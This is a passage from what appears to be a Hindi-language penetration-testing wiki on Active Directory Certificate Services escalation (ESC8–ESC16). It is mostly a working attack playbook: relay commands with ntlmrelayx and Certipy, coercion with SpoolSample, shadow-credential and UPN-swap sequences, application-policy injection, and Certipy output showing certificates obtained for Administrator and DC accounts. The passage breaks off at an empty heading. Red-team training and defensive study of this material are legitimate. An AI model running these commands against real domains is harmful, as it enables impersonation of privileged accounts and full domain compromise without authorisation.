- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service और **Network Device Enrollment Service** (NDES) default रूप से अपने Authorization HTTP header के माध्यम से negotiate authentication support करते हैं। Negotiate authentication **Kerberos और NTLM दोनों** को support करता है, जिससे attacker relay attacks के दौरान authentication को **NTLM पर downgrade** कर सकता है। हालांकि ये web services default रूप से HTTPS enable करती हैं, केवल HTTPS **NTLM relay attacks से सुरक्षा नहीं देता**। HTTPS services के लिए NTLM relay attacks से protection तभी संभव है जब HTTPS को channel binding के साथ combine किया जाए। दुर्भाग्य से, AD CS IIS पर Extended Protection for Authentication activate नहीं करता, जो channel binding के लिए आवश्यक है।<sup>[[6]](#references)</sup>

NTLM relay attacks के साथ एक सामान्य **issue** NTLM sessions की **कम अवधि** और उन services के साथ interact न कर पाना है जो **NTLM signing आवश्यक** करती हैं।

फिर भी, user के लिए certificate प्राप्त करने हेतु NTLM relay attack का abuse करके इस limitation को दूर किया जा सकता है, क्योंकि certificate की validity period session की duration निर्धारित करती है और certificate का उपयोग उन services के साथ किया जा सकता है जो **NTLM signing अनिवार्य** करती हैं। Stolen certificate का उपयोग करने के instructions के लिए देखें:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks की एक अन्य limitation यह है कि **attacker-controlled machine को victim account द्वारा authenticate किया जाना आवश्यक है**। Attacker या तो प्रतीक्षा कर सकता है या इस authentication को **force** करने का प्रयास कर सकता है:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) का `cas` **enabled HTTP AD CS endpoints** enumerate करता है:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` property का उपयोग enterprise Certificate Authorities (CAs) द्वारा Certificate Enrollment Service (CES) endpoints को संग्रहीत करने के लिए किया जाता है। इन endpoints को **Certutil.exe** tool का उपयोग करके parse और list किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify का दुरुपयोग
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

Certificate का request डिफ़ॉल्ट रूप से Certipy द्वारा `Machine` या `User` template के आधार पर किया जाता है, जो इस बात से निर्धारित होता है कि relay किए जा रहे account का नाम `$` पर समाप्त होता है या नहीं। किसी वैकल्पिक template को निर्दिष्ट करने के लिए `-template` parameter का उपयोग किया जा सकता है।

इसके बाद authentication को coerce करने के लिए [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी technique का उपयोग किया जा सकता है। Domain controllers के साथ काम करते समय `-template DomainController` निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### व्याख्या

**`msPKI-Enrollment-Flag`** के लिए नया मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`), जिसे ESC9 कहा जाता है, certificate में **नई `szOID_NTDS_CA_SECURITY_EXT` security extension** को embed होने से रोकता है। यह flag तब प्रासंगिक होता है जब `StrongCertificateBindingEnforcement` को `1` (default setting) पर सेट किया गया हो, जो `2` की setting से अलग है। इसकी प्रासंगिकता उन scenarios में बढ़ जाती है जहाँ Kerberos या Schannel के लिए कमजोर certificate mapping का exploitation किया जा सकता है (जैसे ESC10 में), क्योंकि ESC9 की अनुपस्थिति requirements को नहीं बदलती।<sup>[[7]](#references)</sup>

वे conditions जिनके अंतर्गत इस flag की setting महत्वपूर्ण हो जाती है:

- `StrongCertificateBindingEnforcement` को `2` पर adjust नहीं किया गया है (default `1` है), या `CertificateMappingMethods` में `UPN` flag शामिल है।
- Certificate को उसकी `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ mark किया गया है।
- Certificate द्वारा कोई भी client authentication EKU निर्दिष्ट किया गया है।
- किसी अन्य account को compromise करने के लिए किसी भी account पर `GenericWrite` permissions उपलब्ध हैं।

### Abuse Scenario

मान लें कि `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` permissions हैं और लक्ष्य `Administrator@corp.local` को compromise करना है। `ESC9` certificate template, जिसमें `Jane@corp.local` enroll करने की permitted है, अपनी `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ configured है।

सबसे पहले, `John` के `GenericWrite` की सहायता से Shadow Credentials का उपयोग करके `Jane` का hash प्राप्त किया जाता है:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
इसके बाद, `Jane` का `userPrincipalName` जानबूझकर `@corp.local` domain भाग को छोड़ते हुए `Administrator` में संशोधित किया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह संशोधन constraints का उल्लंघन नहीं करता, क्योंकि `Administrator@corp.local`, `Administrator` के `userPrincipalName` के रूप में अलग रहता है।

इसके बाद, vulnerable के रूप में चिह्नित `ESC9` certificate template को `Jane` के रूप में request किया जाता है:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
यह नोट किया गया है कि certificate का `userPrincipalName` `Administrator` को दर्शाता है, जिसमें कोई भी “object SID” नहीं है।

इसके बाद `Jane` का `userPrincipalName` उसके मूल मान, `Jane@corp.local`, पर वापस सेट कर दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
जारी किए गए certificate से authentication का प्रयास करने पर अब `Administrator@corp.local` का NT hash प्राप्त होता है। Certificate में domain specification न होने के कारण command में `-domain <domain>` शामिल करना आवश्यक है:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## कमजोर Certificate Mappings - ESC10

### Explanation

डोमेन controller पर दो registry key values को ESC10 के अंतर्गत संदर्भित किया जाता है:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के अंतर्गत `CertificateMappingMethods` का default value `0x18` (`0x8 | 0x10`) है, जिसे पहले `0x1F` पर सेट किया गया था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के अंतर्गत `StrongCertificateBindingEnforcement` की default setting `1` है, जो पहले `0` थी।<sup>[[7]](#references)</sup>

**Case 1**

जब `StrongCertificateBindingEnforcement` को `0` के रूप में configure किया गया हो।

**Case 2**

यदि `CertificateMappingMethods` में `UPN` bit (`0x4`) शामिल हो।

### Abuse Case 1

`StrongCertificateBindingEnforcement` को `0` के रूप में configure किए जाने पर, `GenericWrite` permissions वाले account A का उपयोग करके किसी भी account B को compromise किया जा सकता है।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` permissions होने पर, attacker का लक्ष्य `Administrator@corp.local` को compromise करना है। यह procedure ESC9 जैसा ही है, जिससे किसी भी certificate template का उपयोग किया जा सकता है।

सबसे पहले, `GenericWrite` का exploitation करके Shadow Credentials के माध्यम से `Jane` का hash प्राप्त किया जाता है।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, `Jane` का `userPrincipalName` constraint violation से बचने के लिए जानबूझकर `@corp.local` भाग हटाकर `Administrator` में बदल दिया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
इसके बाद, client authentication सक्षम करने वाला certificate, default `User` template का उपयोग करके `Jane` के रूप में request किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
इसके बाद `Jane` का `userPrincipalName` उसके मूल मान, `Jane@corp.local`, पर वापस कर दिया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्राप्त certificate के साथ authenticate करने पर `Administrator@corp.local` का NT hash प्राप्त होगा। command में domain निर्दिष्ट करना आवश्यक है, क्योंकि certificate में domain की जानकारी मौजूद नहीं है।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`UPN` bit flag (`0x4`) वाले `CertificateMappingMethods` के साथ, `GenericWrite` permissions वाला account A, `userPrincipalName` property से रहित किसी भी account B को compromise कर सकता है, जिसमें machine accounts और built-in domain administrator `Administrator` भी शामिल हैं।

यहाँ लक्ष्य `DC$@corp.local` को compromise करना है, जिसकी शुरुआत `GenericWrite` का लाभ उठाकर Shadow Credentials के माध्यम से `Jane` का hash प्राप्त करने से होती है।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
client authentication के लिए डिफ़ॉल्ट `User` template का उपयोग करके `Jane` के रूप में certificate का अनुरोध किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` इस प्रक्रिया के बाद अपने मूल मान पर वापस आ जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel के माध्यम से authentication करने के लिए, Certipy का `-ldap-shell` option उपयोग किया जाता है, जो `u:CORP\DC$` के रूप में authentication की सफलता दर्शाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell के माध्यम से, `set_rbcd` जैसे commands Resource-Based Constrained Delegation (RBCD) attacks को सक्षम करते हैं, जिससे domain controller से संभावित रूप से compromise हो सकता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
यह vulnerability ऐसे किसी भी user account तक भी विस्तारित होती है जिसमें `userPrincipalName` मौजूद नहीं है या यह `sAMAccountName` से match नहीं करता। डिफ़ॉल्ट `Administrator@corp.local` एक प्रमुख target है, क्योंकि इसके पास elevated LDAP privileges होते हैं और डिफ़ॉल्ट रूप से `userPrincipalName` मौजूद नहीं होता।

## Relaying NTLM to ICPR - ESC11

### Explanation

यदि CA Server को `IF_ENFORCEENCRYPTICERTREQUEST` के साथ configure नहीं किया गया है, तो RPC service के माध्यम से signing के बिना NTLM relay attacks किए जा सकते हैं। [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

आप `certipy` का उपयोग करके यह enumerate कर सकते हैं कि `Enforce Encryption for Requests` Disabled है या नहीं। यदि यह Disabled है, तो certipy `ESC11` Vulnerabilities दिखाएगा।
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### दुरुपयोग परिदृश्य

इसके लिए एक relay server सेटअप करना आवश्यक है:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
नोट: domain controllers के लिए, हमें DomainController में `-template` निर्दिष्ट करना होगा।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) का उपयोग करके:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## ADCS CA with YubiHSM पर Shell access - ESC12

### Explanation

Administrators Certificate Authority को "Yubico YubiHSM2" जैसे external device पर store करने के लिए configure कर सकते हैं।

यदि USB device CA server से USB port के माध्यम से connected है, या CA server virtual machine होने की स्थिति में USB device server से connected है, तो YubiHSM में keys generate और utilize करने के लिए Key Storage Provider को एक authentication key (जिसे कभी-कभी "password" भी कहा जाता है) की आवश्यकता होती है।

यह key/password registry में `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` के अंतर्गत cleartext में stored होता है।

Reference [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

यदि CA की private key किसी physical USB device पर stored है और आपको shell access मिल जाता है, तो key recover करना possible है।

सबसे पहले, आपको CA certificate प्राप्त करना होगा (यह public है) और फिर:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
अंत में, CA certificate और उसकी private key का उपयोग करके एक नया arbitrary certificate forge करने के लिए certutil `-sign` command का उपयोग करें।

## OID Group Link Abuse - ESC13

### व्याख्या

`msPKI-Certificate-Policy` attribute certificate template में issuance policy जोड़ने की अनुमति देता है। Issuance policies जारी करने के लिए जिम्मेदार `msPKI-Enterprise-Oid` objects को PKI OID container के Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) में खोजा जा सकता है। किसी policy को इस object के `msDS-OIDToGroupLink` attribute का उपयोग करके AD group से link किया जा सकता है, जिससे system certificate प्रस्तुत करने वाले user को इस प्रकार authorize कर सकता है जैसे वह उस group का member हो। [यहां reference](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)।<sup>[[12]](#references)</sup>

दूसरे शब्दों में, जब किसी user के पास certificate enroll करने की permission हो और certificate किसी OID group से link हो, तो user इस group के privileges inherit कर सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

ऐसी user permission खोजें जिसका उपयोग `certipy find` या `Certify.exe find /showAllPermissions` कर सके।

यदि `John` के पास `VulnerableTemplate` में enroll करने की permission है, तो user `VulnerableGroup` group के privileges inherit कर सकता है।

उसे केवल template specify करना होगा; उसे `OIDToGroupLink` rights वाला certificate मिल जाएगा।
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Explanation

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping पर दिया गया विवरण उल्लेखनीय रूप से व्यापक है। नीचे मूल पाठ का उद्धरण दिया गया है।<sup>[[14]](#references)</sup>

ESC14 "weak explicit certificate mapping" से उत्पन्न vulnerabilities को संबोधित करता है, जो मुख्य रूप से Active Directory user या computer accounts पर `altSecurityIdentities` attribute के दुरुपयोग या असुरक्षित configuration के कारण होती हैं। यह multi-valued attribute administrators को authentication उद्देश्यों के लिए X.509 certificates को AD account के साथ manually associate करने की अनुमति देता है। जब यह populated होता है, तो ये explicit mappings default certificate mapping logic को override कर सकती हैं, जो आमतौर पर certificate के SAN में मौजूद UPNs या DNS names, अथवा `szOID_NTDS_CA_SECURITY_EXT` security extension में embedded SID पर निर्भर करता है।

एक "weak" mapping तब होती है जब `altSecurityIdentities` attribute में certificate की पहचान करने के लिए उपयोग किया गया string value बहुत व्यापक, आसानी से अनुमान लगाने योग्य, non-unique certificate fields पर निर्भर, या आसानी से spoof किए जा सकने वाले certificate components का उपयोग करता है। यदि कोई attacker ऐसे certificate को प्राप्त या बना सकता है जिसके attributes किसी privileged account की weakly defined explicit mapping से match करते हों, तो वह उस certificate का उपयोग करके उस account के रूप में authenticate और impersonate कर सकता है।

संभावित रूप से weak `altSecurityIdentities` mapping strings के उदाहरण:

- केवल common Subject Common Name (CN) के आधार पर mapping: जैसे, `X509:<S>CN=SomeUser`। कोई attacker कम सुरक्षित source से इस CN वाला certificate प्राप्त कर सकता है।
- बिना किसी अतिरिक्त qualification, जैसे specific serial number या subject key identifier, अत्यधिक generic Issuer Distinguished Names (DNs) या Subject DNs का उपयोग: जैसे, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`।
- अन्य predictable patterns या non-cryptographic identifiers का उपयोग, जिन्हें कोई attacker ऐसे certificate में satisfy कर सकता है जिसे वह legitimately प्राप्त या forge कर सकता है (यदि उसने CA को compromise कर लिया हो या ESC1 जैसी vulnerable template खोज ली हो)।

`altSecurityIdentities` attribute mapping के लिए विभिन्न formats का समर्थन करता है, जैसे:

- `X509:<I>IssuerDN<S>SubjectDN` (full Issuer और Subject DN के आधार पर mapping)
- `X509:<SKI>SubjectKeyIdentifier` (certificate के Subject Key Identifier extension value के आधार पर mapping)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number के आधार पर mapping, जिसे Issuer DN implicitly qualify करता है) - यह standard format नहीं है; आमतौर पर यह `<I>IssuerDN<SR>SerialNumber` होता है।
- `X509:<RFC822>EmailAddress` (SAN से RFC822 name, आमतौर पर email address, के आधार पर mapping)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate की raw public key के SHA1 hash के आधार पर mapping - सामान्यतः strong)

इन mappings की security mapping string में उपयोग किए गए certificate identifiers की specificity, uniqueness और cryptographic strength पर बहुत अधिक निर्भर करती है। Domain Controllers पर strong certificate binding modes enabled होने पर भी (जो मुख्य रूप से SAN UPNs/DNS और SID extension पर आधारित implicit mappings को प्रभावित करते हैं), खराब configuration वाली `altSecurityIdentities` entry impersonation का direct path प्रदान कर सकती है, यदि mapping logic स्वयं flawed या बहुत permissive हो।

### Abuse Scenario

ESC14 Active Directory (AD) में **explicit certificate mappings**, विशेष रूप से `altSecurityIdentities` attribute, को target करता है। यदि यह attribute (design या misconfiguration के कारण) set है, तो attackers ऐसी certificates प्रस्तुत करके accounts को impersonate कर सकते हैं जो mapping से match करती हों।

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: Attacker के पास target account के `altSecurityIdentities` attribute पर write permissions हैं, या target AD object पर निम्न में से किसी permission के रूप में इसे grant करने की permission है:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*।

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: Target के पास `altSecurityIdentities` में weak X509RFC822 mapping है। Attacker victim के mail attribute को target के X509RFC822 name से match करने के लिए set कर सकता है, victim के रूप में certificate enroll कर सकता है और target के रूप में authenticate करने के लिए उसका उपयोग कर सकता है।

#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: Target के पास `altSecurityIdentities` में weak X509IssuerSubject explicit mapping है। Attacker victim principal पर `cn` या `dNSHostName` attribute को target की X509IssuerSubject mapping के subject से match करने के लिए set कर सकता है। इसके बाद attacker victim के रूप में certificate enroll कर सकता है और target के रूप में authenticate करने के लिए इस certificate का उपयोग कर सकता है।

#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: Target के पास `altSecurityIdentities` में weak X509SubjectOnly explicit mapping है। Attacker victim principal पर `cn` या `dNSHostName` attribute को target की X509SubjectOnly mapping के subject से match करने के लिए set कर सकता है। इसके बाद attacker victim के रूप में certificate enroll कर सकता है और target के रूप में authenticate करने के लिए इस certificate का उपयोग कर सकता है।

### concrete operations
#### Scenario A

Certificate template `Machine` का certificate request करें
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
प्रमाणपत्र को सहेजें और परिवर्तित करें
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authenticate (certificate का उपयोग करके)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Cleanup (वैकल्पिक)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
विभिन्न attack scenarios में अधिक विशिष्ट attack methods के लिए, निम्नलिखित देखें: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)।<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### विवरण

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc पर दिया गया विवरण उल्लेखनीय रूप से विस्तृत है। नीचे मूल text का उद्धरण दिया गया है।<sup>[[15]](#references)</sup>

Built-in default version 1 certificate templates का उपयोग करके, attacker ऐसा CSR तैयार कर सकता है जिसमें application policies शामिल हों, जिन्हें template में निर्दिष्ट configured Extended Key Usage attributes की तुलना में प्राथमिकता दी जाती है। इसके लिए केवल enrollment rights आवश्यक हैं, और इसका उपयोग **_WebServer_** template का उपयोग करके client authentication, certificate request agent और codesigning certificates बनाने के लिए किया जा सकता है।

### दुरुपयोग

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) में अधिक विस्तृत usage examples दिए गए हैं।<sup>[[14]](#references)</sup>


यदि CA unpatched है, तो Certipy का `find` command उन V1 templates की पहचान करने में सहायता कर सकता है जो संभावित रूप से ESC15 के प्रति susceptible हैं।
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel के माध्यम से Direct Impersonation

**Step 1: "Client Authentication" Application Policy और target UPN inject करते हुए certificate request करें।** Attacker `attacker@corp.local`, "WebServer" V1 template का उपयोग करके `administrator@corp.local` को target करता है (जो enrollee-supplied subject की अनुमति देता है)।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" वाला vulnerable V1 template।
- `-application-policies 'Client Authentication'`: CSR के Application Policies extension में OID `1.3.6.1.5.5.7.3.2` inject करता है।
- `-upn 'administrator@corp.local'`: impersonation के लिए SAN में UPN सेट करता है।

**Step 2: प्राप्त certificate का उपयोग करके Schannel (LDAPS) के माध्यम से authenticate करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: Enrollment Agent Abuse के माध्यम से PKINIT/Kerberos Impersonation

**Step 1: V1 template से एक certificate request करें (जिसमें "Enrollee supplies subject" सक्षम हो), और "Certificate Request Agent" Application Policy inject करें।** यह certificate attacker (`attacker@corp.local`) के लिए enrollment agent बनने हेतु है। यहां attacker की अपनी identity के लिए कोई UPN निर्दिष्ट नहीं किया गया है, क्योंकि लक्ष्य agent capability प्राप्त करना है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` inject करता है।

**Step 2: target privileged user की ओर से certificate request करने के लिए "agent" certificate का उपयोग करें।** यह ESC3-like step है, जिसमें Step 1 के certificate को agent certificate के रूप में उपयोग किया जाता है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**चरण 3: "on-behalf-of" certificate का उपयोग करके privileged user के रूप में Authenticate करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA पर Security Extension Disabled (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** उस स्थिति को संदर्भित करता है जिसमें, यदि AD CS का configuration सभी certificates में **szOID_NTDS_CA_SECURITY_EXT** extension को शामिल करना लागू नहीं करता है, तो attacker इसका फायदा उठाकर:

1. **SID binding के बिना** certificate request कर सकता है।

2. इस certificate का उपयोग **किसी भी account के रूप में authentication** के लिए कर सकता है, जैसे किसी high-privilege account (उदाहरण के लिए, Domain Administrator) का impersonation करना।

विस्तृत principle के बारे में अधिक जानने के लिए आप इस article को भी देख सकते हैं:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

निम्नलिखित [इस link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) को reference करता है। अधिक विस्तृत usage methods देखने के लिए Click करें।<sup>[[14]](#references)</sup>

यह पहचानने के लिए कि Active Directory Certificate Services (AD CS) environment **ESC16** के प्रति vulnerable है,
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**चरण 1: victim account का प्रारंभिक UPN पढ़ें (वैकल्पिक - पुनर्स्थापना के लिए)।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**चरण 2: victim account के UPN को target administrator के `sAMAccountName` पर अपडेट करें।
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**चरण 3: (यदि आवश्यक हो) "victim" account के लिए credentials प्राप्त करें (जैसे, Shadow Credentials के माध्यम से)।**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16-vulnerable CA पर _any suitable client authentication template_ (जैसे, "User") से "victim" user के रूप में certificate request करें।** क्योंकि CA ESC16 के प्रति vulnerable है, इसलिए template की इस extension के लिए specific settings चाहे जो हों, issued certificate से SID security extension अपने-आप omit हो जाएगी। Kerberos credential cache environment variable सेट करें (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
फिर certificate का अनुरोध करें:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**चरण 5: "victim" account का UPN वापस पहले जैसा करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**चरण 6: लक्ष्य administrator के रूप में authenticate करें।**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### व्याख्या

